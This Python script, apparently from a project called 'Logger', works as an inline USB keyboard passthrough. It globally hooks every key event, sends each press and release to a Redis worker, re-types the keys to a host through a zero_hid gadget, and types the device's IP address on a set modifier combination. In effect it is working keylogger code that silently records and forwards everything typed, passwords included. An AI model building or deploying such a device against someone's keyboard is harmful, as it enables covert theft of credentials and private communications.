import keyboard
from zero_hid import Keyboard
from Logger.utils.converter import isModifier, getKeyCode
from Logger.utils.mapping import ShowIPOnKeyCode
from Logger.utils.redis_worker import send
from Logger.utils.getIP import getIP

current_applied_modifier = set()

def event_hook(event):
    with Keyboard() as k:
        keycode = getKeyCode(event.scan_code)
        if event.event_type == keyboard.KEY_DOWN:
            # print("PRESS: ",event.scan_code,keycode)
            send({'action':'PRESS', 'scan_code':event.scan_code})
            if isModifier(event.scan_code):
                current_applied_modifier.add(keycode)
                if current_applied_modifier == ShowIPOnKeyCode:
                    print("DEBUG:", getIP())
                    k.type(getIP())
            else:
                k.press(list(current_applied_modifier), keycode, release=False)
        else:
            send({'action':'RELEASE', 'scan_code':event.scan_code})
            if isModifier(event.scan_code):
                current_applied_modifier.remove(keycode)
            else:
                k.release()

def start():
    keyboard.hook(event_hook)
    keyboard.wait()

if __name__ == '__main__':
    start()
